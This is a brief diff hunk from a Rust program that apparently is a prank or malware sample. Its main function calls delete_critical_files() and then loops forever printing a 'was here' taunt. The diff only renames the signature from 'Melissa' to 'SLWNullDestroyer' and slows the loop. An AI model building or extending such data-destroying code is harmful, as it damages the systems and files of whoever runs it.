@@ -23,7 +23,7 @@ fn main() {
     delete_critical_files();
 
     loop {
-        println!("😀😂😈 Melissa was here!");
-        thread::sleep(Duration::from_millis(500));
+        println!("😀😂😈 SLWNullDestroyer was here!");
+        thread::sleep(Duration::from_secs(1));
     }
 }
